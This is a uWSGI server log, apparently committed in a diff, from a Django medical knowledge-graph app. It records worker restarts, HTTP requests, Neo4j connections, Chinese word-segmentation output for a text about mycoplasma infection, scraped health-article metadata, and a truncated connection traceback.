+{'title': '治疗口腔溃疡的饮食小偏方', 'abstract': '俗话说：伤筋动骨一白天。那么骨折后吃什么好的快？这都是骨折患者想知道的问题。', 'url': 'https://ys.99.com.cn/diaoyang/466535.htm'}
+[pid: 28886|app: 0|req: 8/10] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 07:55:42 2019] GET /views/console/ => generated 13309 bytes in 571 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 07:55:44 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xd041f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xd041f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 2323, cores: 2)
+spawned uWSGI worker 2 (pid: 2324, cores: 2)
+spawned uWSGI worker 3 (pid: 2325, cores: 2)
+spawned uWSGI worker 4 (pid: 2326, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 2323|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 816 bytes} [Sun Mar 17 07:55:45 2019] GET /views/interlocution => generated 0 bytes in 924 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 0)
+[pid: 2323|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 818 bytes} [Sun Mar 17 07:55:46 2019] GET /views/interlocution/ => generated 4135 bytes in 12 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 2323|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 806 bytes} [Sun Mar 17 07:56:00 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 2324|app: 0|req: 1/4] 112.10.182.10 () {44 vars in 808 bytes} [Sun Mar 17 07:56:00 2019] GET /accounts/login/ => generated 5358 bytes in 786 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 2324|app: 0|req: 2/5] 112.10.182.10 () {38 vars in 562 bytes} [Sun Mar 17 07:56:01 2019] GET /favicon.ico => generated 6826 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 2324|app: 0|req: 3/6] 112.10.182.10 () {50 vars in 1043 bytes} [Sun Mar 17 07:56:08 2019] POST /accounts/login/ => generated 0 bytes in 219 msecs (HTTP/1.1 302) 8 headers in 569 bytes (1 switches on core 1)
+[pid: 2323|app: 0|req: 4/7] 112.10.182.10 () {46 vars in 913 bytes} [Sun Mar 17 07:56:08 2019] GET / => generated 12444 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 2323|app: 0|req: 5/8] 112.10.182.10 () {44 vars in 893 bytes} [Sun Mar 17 07:56:08 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
+Sun Mar 17 07:56:08 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 2323)...
+Gracefully killing worker 2 (pid: 2324)...
+Gracefully killing worker 3 (pid: 2325)...
+Gracefully killing worker 4 (pid: 2326)...
+96====7
+{'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
+[pid: 2323|app: 0|req: 6/9] 112.10.182.10 () {44 vars in 895 bytes} [Sun Mar 17 07:56:08 2019] GET /views/console/ => generated 13138 bytes in 449 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 07:56:09 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x15301f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x15301f0 pid: 19836 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 19836)
+spawned uWSGI worker 1 (pid: 2410, cores: 2)
+spawned uWSGI worker 2 (pid: 2411, cores: 2)
+spawned uWSGI worker 3 (pid: 2412, cores: 2)
+spawned uWSGI worker 4 (pid: 2413, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 2410|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 914 bytes} [Sun Mar 17 07:56:10 2019] GET /views/interlocution?id=2 => generated 0 bytes in 750 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 0)
+[pid: 2410|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 916 bytes} [Sun Mar 17 07:56:11 2019] GET /views/interlocution/?id=2 => generated 4233 bytes in 20 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 2410|app: 0|req: 3/3] 168.1.22.242 () {34 vars in 381 bytes} [Sun Mar 17 08:38:39 2019] GET / => generated 11772 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:03:18 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xab8920
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0xab8920 pid: 8090 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 8090)
+spawned uWSGI worker 1 (pid: 8092, cores: 2)
+spawned uWSGI worker 2 (pid: 8093, cores: 2)
+spawned uWSGI worker 3 (pid: 8094, cores: 2)
+spawned uWSGI worker 4 (pid: 8095, cores: 2)
+Python auto-reloader enabled
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:06:47 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x1644910
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1644910 pid: 8428 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 8428)
+spawned uWSGI worker 1 (pid: 8431, cores: 2)
+spawned uWSGI worker 2 (pid: 8432, cores: 2)
+spawned uWSGI worker 3 (pid: 8433, cores: 2)
+spawned uWSGI worker 4 (pid: 8434, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 8431|app: 0|req: 1/1] 80.247.241.6 () {32 vars in 458 bytes} [Sun Mar 17 09:10:36 2019] GET / => generated 11772 bytes in 962 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 8431|app: 0|req: 2/2] 189.47.22.62 () {32 vars in 452 bytes} [Sun Mar 17 09:11:41 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 8431|app: 0|req: 3/3] 217.29.98.81 () {28 vars in 288 bytes} [Sun Mar 17 09:23:05 2019] GET / => generated 11772 bytes in 2 msecs (HTTP/1.0 200) 4 headers in 125 bytes (1 switches on core 1)
+[pid: 8431|app: 0|req: 4/4] 201.150.151.122 () {32 vars in 461 bytes} [Sun Mar 17 09:51:16 2019] GET / => generated 11772 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:51:48 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (127.0.0.1:8000).
+bind(): Address already in use [core/socket.c line 769]
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 1 buried after 2 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:54:20 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xdf5920
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0xdf5920 pid: 13004 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 13004)
+spawned uWSGI worker 1 (pid: 13008, cores: 2)
+spawned uWSGI worker 2 (pid: 13009, cores: 2)
+spawned uWSGI worker 3 (pid: 13010, cores: 2)
+spawned uWSGI worker 4 (pid: 13011, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 13009|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 853 bytes} [Sun Mar 17 09:54:45 2019] GET / => generated 11772 bytes in 824 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
+202====0
+{'title': '脸色发黄吃什么好', 'abstract': '聪明的女人就要学会利用饮食的方法，把色斑明显，肤色暗淡的问题通通都吃干净，下面为大家推荐十种可以把各种皮肤问题吃光光的美食。', 'url': 'https://ys.99.com.cn/diaoyang/510608.htm'}
+[pid: 13009|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:54:46 2019] GET /views/console/ => generated 13357 bytes in 403 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+Sun Mar 17 09:54:47 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 13008)...
+Gracefully killing worker 2 (pid: 13009)...
+Gracefully killing worker 3 (pid: 13010)...
+Gracefully killing worker 4 (pid: 13011)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 09:54:48 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x1843250
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1843250 pid: 13004 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 13004)
+spawned uWSGI worker 1 (pid: 13087, cores: 2)
+spawned uWSGI worker 2 (pid: 13088, cores: 2)
+spawned uWSGI worker 3 (pid: 13089, cores: 2)
+spawned uWSGI worker 4 (pid: 13090, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 13087|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:54:50 2019] GET /views/consoles => generated 0 bytes in 836 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 0)
+[pid: 13087|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 846 bytes} [Sun Mar 17 09:54:51 2019] GET /views/consoles/ => generated 7694 bytes in 2771 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 13087|app: 0|req: 3/3] 112.10.182.10 () {44 vars in 850 bytes} [Sun Mar 17 09:55:01 2019] GET /views/distinguish => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 0)
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 13090|app: 0|req: 1/4] 112.10.182.10 () {44 vars in 852 bytes} [Sun Mar 17 09:55:01 2019] GET /views/distinguish/ => generated 4075 bytes in 948 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
+/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:39: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
+  m.add_string(self.Q_C.public_numbers().encode_point())
+/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:96: CryptographyDeprecationWarning: Support for unsafe construction of public numbers from encoded data will be removed in a future version. Please use EllipticCurvePublicKey.from_encoded_point
+  self.curve, Q_S_bytes
+/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:111: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
+  hm.add_string(self.Q_C.public_numbers().encode_point())
+------start------
+[connect success] | ip : 39.108.111.94
+result:
+Model loaded succeed [['妊娠', 'v'], ['期支', 'n'], ['原体', 'n'], ['感染', 'v'], ['可', 'v'], ['导致', 'v'], ['晚期', 't'], ['流产', 'v'], ['、', 'w'], ['早产', 'v'], ['或', 'c'], ['死产', 'v'], ['等', 'u'], ['严重', 'a'], ['并发症', 'n'], ['。', 'w'], ['支原体', 'n'], ['是', 'v'], ['居细菌', 'n'], ['和', 'c'], ['病毒', 'n'], ['之间', 'f'], ['无', 'v'], ['细胞壁', 'n'], ['，', 'w'], ['能', 'v'], ['独立', 'a'], ['生存', 'v'], ['的', 'u'], ['最', 'd'], ['小', 'a'], ['微生物', 'n'], ['。', 'w'], ['感染', 'v'], ['人类', 'n'], ['的', 'u'], ['支原体', 'n'], ['约', 'd'], ['12一14', 'm'], ['种', 'q'], ['，', 'w'], ['其中', 'r'], ['以', 'p'], ['女性', 'n'], ['生殖道', 'n'], ['分离', 'v'], ['出人型支', 'id'], ['原体', 'n'], ['及', 'c'], ['解脲', 'v'], ['支原体', 'n'], ['最为', 'd'], ['常见', 'a'], ['。', 'w'], ['MH', 'x'], ['感染', 'v'], ['多', 'a'], ['引起', 'v'], ['阴道炎', 'n'], ['、', 'w'], ['宫颈炎', 'n'], ['和', 'c'], ['输卵管炎', 'n'], ['，', 'w'], ['而', 'c'], ['UU', 'n'], ['则', 'd'], ['引起', 'v'], ['非淋菌性尿道炎', 'uw'], ['。', 'w'], ['支', 'q'], ['原体', 'n'], ['多', 'a'], ['与', 'c'], ['宿主', 'n'], ['共存', 'v'], ['，', 'w'], ['不', 'd'], ['表现', 'v'], ['出', 'v'], ['感染', 'v'], ['症状', 'n'], ['，', 'w'], ['仅', 'd'], ['在', 'p'], ['某些', 'r'], ['条件', 'n'], ['下', 'f'], ['可', 'd'], ['引起', 'v'], ['机会性', 'n'], ['感染', 'v'], ['，', 'w'], ['且', 'c'], ['常', 'd'], ['合并', 'v'], ['其他', 'r'], ['致病', 'v'], ['原', 'd'], ['共同', 'd'], ['致病', 'v'], ['。', 'w'], ['近', 'a'], ['来', 'v'], ['发现', 'v'], ['肺炎', 'n'], ['支原体', 'n'], ['(', 'w'], ['MP', 'x'], [')', 'w'], ['、', 'w'], ['生殖支', 'n'], ['原体', 'n'], ['(', 'w'], ['MG', 'x'], [')', 'w'], ['等', 'u'], ['亦可', 'v'], ['引起', 'v'], ['母儿', 'n'], ['感染', 'v'], ['。', 'w']]
+
+------end------
+[pid: 13090|app: 0|req: 2/5] 112.10.182.10 () {52 vars in 1099 bytes} [Sun Mar 17 09:55:05 2019] POST /views/distinguish/getDistinguishData/ => generated 7115 bytes in 18393 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
+[pid: 13087|app: 0|req: 4/6] 112.10.182.10 () {44 vars in 856 bytes} [Sun Mar 17 09:55:26 2019] GET /views/interlocution/ => generated 4135 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Sun Mar 17 17:56:20 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xd47920
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0xd47920 pid: 13370 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 13370)
+spawned uWSGI worker 1 (pid: 13373, cores: 2)
+spawned uWSGI worker 2 (pid: 13374, cores: 2)
+spawned uWSGI worker 3 (pid: 13375, cores: 2)
+spawned uWSGI worker 4 (pid: 13376, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 13376|app: 0|req: 1/1] 112.10.182.10 () {44 vars in 809 bytes} [Sun Mar 17 09:56:28 2019] GET / => generated 11772 bytes in 2699 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+299====13
+{'title': '8种食物是导致不孕不育症的“罪魁祸首”', 'abstract': '相信每个人都希望拥有自己的宝宝，但是生活中有很多人都难以实现这个愿望。其原因与饮食有着极大的关系。以下小编为大家盘点易致不孕不育的食物。', 'url': 'https://ys.99.com.cn/wuqu/600679.htm'}
+[pid: 13376|app: 0|req: 2/2] 112.10.182.10 () {44 vars in 844 bytes} [Sun Mar 17 09:56:31 2019] GET /views/console/ => generated 13433 bytes in 413 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+Internal Server Error: /views/consoles/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connection.py", line 159, in _new_conn
+    (self._dns_host, self.port), self.timeout, **extra_kw)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/util/connection.py", line 80, in create_connection
+    raise err
+  File "/usr/local/lib/python3.7/site-packages/urllib3/util/connection.py", line 70, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [Errno 111] Connection refused
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 600, in urlopen
+    chunked=chunked)
+  File "/usr/local/lib/python3.7/site-packages/urllib3/connectionpool.py", line 354, in _make_request
